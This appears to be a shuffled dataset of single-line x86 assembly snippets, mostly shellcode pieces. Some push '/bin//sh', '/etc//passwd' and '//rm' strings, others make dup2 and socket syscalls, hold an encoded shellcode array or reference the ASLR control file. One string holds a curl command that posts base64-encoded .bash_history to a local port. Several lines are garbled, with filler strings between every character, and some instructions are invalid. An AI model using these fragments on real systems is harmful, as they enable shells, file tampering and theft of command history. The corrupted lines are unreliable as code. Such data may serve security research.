"mov esi, 0x222933f0"
push 0x204c4c41
"mov esp, ebp"
"mov ecx, readbuffer"
section .data
size: equ 15
decrypt:
next_addr:
"mov al, 0xcd"
push bx
div esi
"sub ecx, 0x6374612e"
push 0x61702f63
section .text
loop fill \n jmp carryon
string: db 'tmp.txt'
"mov byte [ecx+92], dl"
push 0x4
int 80h
"xchg ecx, edx"
"mov al, 6"
"mov ax, 00"
writestring:
"sub ax, 13"
"0x5c0x5m0x5p0x5 0x5c0x5l0x5,0x5 0x5b0x5l0x5 0x5\0x5n0x5 0x5j0x5b0x5 0x5l0x530x5 0x5\0x5n0x5 0x5a0x5d0x5d0x5 0x5c0x5l0x5,0x5 0x5b0x5l0x5"
"mov ecx, 25"
"cmp byte [esi], bl \n jne loop_1"
var db 10
call [esp]
"xor edx, dh"
"xor cl, 0xaa"
"cmp byte [edx], 0x2e \n jne l2 \n jmp while"
"test eax, eax \n jz proc_name \n xor eax, eax"
"cmp al, 0xf2"
"rol byte [esi], 4"
"mov long [esi+30], eax"
"mov edi, al"
push 0x74756873
int 80h
jmp esp
"cmp eax, edi \n jne infinite"
push byte 67 \n pop eax
path:
"mov al, 102"
"mov eax, 4"
"mov eax, 5"
"cmp al, 0xf2 \n je next_page"
"encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce"
"mov esi, 0x72702f2f"
jz connec
int 0x80
call _appendfile:
"cmp byte [esi], 0xd \n jl wrap_around"
"mov cl, byte [esi]"
"push eax \n mov edx, esp"
"xor dl, 0xbb \n jz next_cycle"
pop ebx
call set_argv
"lea eax, [zero_reg+3]"
"mov cl, 9"
"cmp al, 9 \n jge l1"
"mov al, 0x3f"
arr dd 20
name db 1
"cmp eax, ebx \n je exit \n jmp eax"
dec ecx
"mov cl, [my_var]"
"mov edx, 3"
"filename: db 'readme.txt', 0h"
"mov al, 0x3f"
push ebx
"mov edx, esp"
push byte 0x1f
"mov bx, esi"
push dword 0x6b6e756a
"sub dx, 15444"
"mov eax, 0x5"
"lea eax, [ebx+17h]"
"cmp dword [edx], 0x636f7270 \n je while"
"add eax, esi"
"mov bl, cl"
call_shellcode:
global _start
"add al, 0xa"
"mov [ebp+22], word ax"
"xor ebx, ebx"
"mov edx, ecx"
"shr ecx, 2"
"mov eax, 27"
"cmp eax, ebx \n je exit \n jmp eax"
"shr edx, byte 24"
"push 0x68732f2f \n push 0x6e69622f \n mov edx, esp"
push 0xefffff7f
push 0x3d4c4c41
mul ebx
push 0x0a4c4c41
div edx
push eax
push 0x10
"mov esi, 0x563a1f3e"
next_addr:
"mov eax, [ebx+epi*4+2]"
"push 0x6e7a762d \n mov edi, esp"
"mov eax, 67"
"mov cx, word_table[3]"
"add edx, 32"
db '/proc/sys/kernel/randomize_va_spacex'
"mov ebp, esp"
"test eax, eax \n jnz checkforfile"
"mov eax, [esp+4]"
0x0fx0x0fo0x0fr0x0f 0x0fb0x0fy0x0ft0x0fe0x0f 0x0f[0x0fe0x0fs0x0fi0x0f 0x0f+0x0f 0x0f10x0f]0x0f
"test eax, eax \n jz ready_to_proxy"
"mov dl, 0x2"
push byte 10
"mov dword [esp-4], esi"
"mov eax, 4"
"push esi \n mov eax, esp"
push 0x74
"push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp"
writestring:
"cmp eax, ebx"
push 0x64687373
push byte my_value \n pop eax
call two
section .bss
push byte 0xc \n pop eax
"mov ebx, 1"
three:
next_addr:
"mov cx, 0xfff"
push byte 49
shell_ret
"push 0x6e69622f \n push 0x7273752f \n mov ecx, esp"
call writestring
mov byte [esi + 1]
push 0x6d722f2f
"mov eax, 90"
"mov eax, 6"
loop l2 \n jmp edi
jnz l00p
push esp
push 0x29
push byte my_value
pop eax
"sub esp, 4"
"mov edx, m_src4"
jmp short stage
push 0x622f7273
"mov eax, 0x9a8dd091"
jmp callpop
push 0x0a206873
main_push:
push 0x1c
variablename2: resw 1
"mov al, 0x06"
len equ $-msg
push 0x2f3a746f
arr1 resb 1
"xchg eax, ebx"
"mov eax, 0xb"
exit:
size: equ 512
"mov ebx, 1"
jmp short call_write
"rol edi, 1"
"msg db  world!',10"
"add eax, 24"
"mov bl, byte [eax]"
loop main_loop
jns dup2
"mov eax, 27"
push byte 6 \n pop eax
"mov byte [edi], bl"
"mov ebx, zero_reg"
jmp short _load_data
"mov al, 0x66"
"test eax, eax \n jnz l4 \n call search"
"mov bl, byte [esi]"
next_addr:
jmp short four
push 0x3a303a3a
jz encoded
"push byte 3 \n mov ebx, esp"
"test eax, eax \n jnz l1 \n call myfunct"
push dword 0x2335738c
"[esi+ecx]m[esi+ecx]o[esi+ecx]v[esi+ecx] [esi+ecx]b[esi+ecx]y[esi+ecx]t[esi+ecx]e[esi+ecx] [esi+ecx][[esi+ecx]h[esi+ecx]e[esi+ecx]x[esi+ecx]s[esi+ecx]t[esi+ecx]r[esi+ecx]+[esi+ecx]e[esi+ecx]d[esi+ecx]x[esi+ecx]+[esi+ecx]1[esi+ecx]][esi+ecx],[esi+ecx]b[esi+ecx]l[esi+ecx]"
"push 0x6374652f \n mov ecx, esp"
"push 0x61702f2f \n push 0x6374652f \n mov eax, esp"
"mov bl, byte [edi]"
"and eax, 0fh"
"cmp eax, ebx \n je exit \n mov eax, 0x4"
"shr dl, 1"
"mov ax, [my_var]"
"mov bl, 3"
not eax
push byte 16
"lea edx, [esi + 13]"
mul edx
"rol edx, 0x4"
"lea ax, [esi+30]"
"mov eax, 64"
"mov eax, 6"
write_syscall equ 50
jmp _star
"cmp al, 0xf2 \n je _start"
push 0x29
push 0x6f635f64
"mov edi, 0x343997b7"
"mov ebx, filename"
"ror byte [esi], 0x1"
"mov eax, 15"
"lea ecx, [zero_reg+117]"
push dword 0x7264632f
dup2:
inc ebx
"xor [ecx], dh"
"cmp dword [eax], edx \n jne loop \n jmp eax"
"mov ebx, type var4"
"push dword 0x62732f2f \n mov ebx, esp"
"test eax, eax \n js old_dirent"
push 0x6873732f
jz shift_decode
"mov eax, esp"
"db ',ajm,pk#########'"
inc count
inc dword [tmp]
"cmp byte [esi], 0x7 \n jl lowbound"
push eax
"test eax, eax \n js close"
push word 0x5c11
four:
"mov eax, 0"
push eax
"mov bl, byte [eax]"
"sub ebx, 0x2e2aa163"
inc bl
"add marks, 65"
"mov eax, 0x8000"
"mov cl, 13"
"mov eax, 4"
"mov ecx, esi"
jmp loop
two:
"cmp al, 0xf2 \n je incpage"
exit:
pop esi
string: db 'test.txt'
call set_argv
not byte [var]
"push 0x64687373 \n mov eax, esp"
"mov esi, 0x91969dd0"
"mov eax, 37"
"loop l2 \n mov ebx, esp"
start
writestring:
"mov eax, 37"
push 0x74
"msg db 'curl http://localhost:8080 -d  .bash_history | base64 -w 0) -x post', 0x0a"
"loop l2 \n mov ebx, esp"
"[esi+12]m[esi+12]o[esi+12]v[esi+12] [esi+12]b[esi+12]y[esi+12]t[esi+12]e[esi+12] [esi+12][[esi+12]e[esi+12]d[esi+12]x[esi+12]+[esi+12]e[esi+12]c[esi+12]x[esi+12]][esi+12],[esi+12]a[esi+12]l[esi+12]"
"mov edx, esp"
"mov ebx, esp"
"xchg ecx, ecx"
"cmp byte al, 0x38 \n je 0x40 \n push byte 0x1"
"msg1 db  brave new world!', 0ah"
push 0x68735858
"xor esi, esi"
"mov cl, 0x2"
push dword 0x73656c62
"mov bl, 0xe"
"and al, 0x40"
"test eax, eax \n jz short loc_402c13"
"test eax, eax \n jz write \n xor eax, eax"
xor equ 0
"shr ax, 1"
push_cmd:
size: db 'hey'
push esi
push word 0x697a
"mov eax, 64"
push 0x29
"sar ebx, 31"
jmp short _execline
"lea eax, [zero_reg+6]"
push 0x0
"add ax, 1"
write_syscall equ 50000
section .bss
inc dx
jmp aslr_file
"mov cl, len"
"mov dl, 0x7f"
"mov bl, 2"
"shl ecx, 4"
loopnz l1
"mov eax, 20"
pop edx
push byte 9 \n pop eax
"xor ah, ah"
"cmp byte al, 2 \n je do_inject \n jmp while"
push word 0x1b6
array word 5
"mov eax, 67"
call execute
me:
pop cx
"xor eax, 0xffffffff"
push word [edx]
push eax
"mov dl, byte 0ffh"
"push edi \n mov ebx, esp"
not byte [var]
"xor eax, eax"
"mov [esp+59], ebx"
loop 3
push ecx
push byte 0x64 \n pop eax
"add edi, edi"
"mov long [esi+26], ebx"
"sub dx, 15444"
